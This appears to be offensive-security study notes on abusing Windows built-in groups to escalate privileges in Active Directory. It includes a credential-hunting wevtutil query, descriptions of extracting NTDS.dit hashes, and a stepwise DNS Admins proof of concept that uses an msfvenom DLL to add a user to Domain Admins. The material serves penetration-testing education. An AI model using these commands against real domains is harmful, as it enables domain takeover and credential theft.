# Built-in Groups Abuse

## **Backup Operators Group**

* Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.
* This group also permits logging in locally to a domain controller.

***

## **Event Log Readers Group**

* Organizations may enable logging of process command lines to help defenders monitor and identify malicious behavior
* Members of this group may read these logs, potentially `finding user credentials`
* Search security logs containing the word `/user` with the **built-in utility** `wevtutil`: `wevtutil qe Security /rd:true /f:text | Select-String "/user"`

***

## **Server Operators Group**

* This group allows members to administer Windows servers without needing assignment of Domain Admin privileges.
* It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
* Members can modify services, access SMB shares, and backup files.
* Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.

***

## **Print Operators Group**

* Members of this group are granted the `SeLoadDriver` privilege
* Members can log on to DCs locally and "trick" Windows into loading a malicious driver.
* This is a good privilege to perform privilege escalation (see above in the `SeLoadDriverPrivilege` section)
* If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, _we will need to bypass UAC_

***

## **Hyper-V Administrators Group**

* The Hyper-V Administrators group has full access to all Hyper-V features.
* If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins.
* They can easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.
* Whenever possible, we can leverage CVE-2018-0952 or CVE-2019-0841 to gain SYSTEM privileges.
* Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

***

## **DNS Admins Group**

* Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server.
* They can load a malicious DLL and wait for a reboot as a persistence mechanism.
* Loading a DLL will often result in the service crashing.
* A more reliable way to exploit this group is to use [cube0x0's exploit](https://cube0x0.github.io/Pocing-Beyond-DA/).
* PoC to add a member to the Domain Admins Group:
  1. Generate dll: `msfvenom -p windows/x64/exec cmd='net group "domain admins" TARGETUSER /add /domain' -f dll -o adduser.dll`
  2. Transfer the file to the target machine
  3. Load a custom DLL: `dnscmd.exe /config /serverlevelplugindll C:path\to\adduser.dll`
  4. CMD only: `sc stop dns`
  5. CMD only: `sc start dns`
  6. Confirm group membership: `net group "Domain Admins" /dom`

***

## **Account Operators Group**

* Members can modify non-protected accounts and groups in the domain.

***

## **Remote Desktop Users Group**

* Members are not given any useful permissions by default
* The main use of members of this group are to Login Through Remote Desktop Services and can move laterally using the RDP protocol.

***

## **Remote Management Users Group**

* Members can log on to DCs with PSRemoting
* This group is sometimes added to the local remote management group on non-DCs
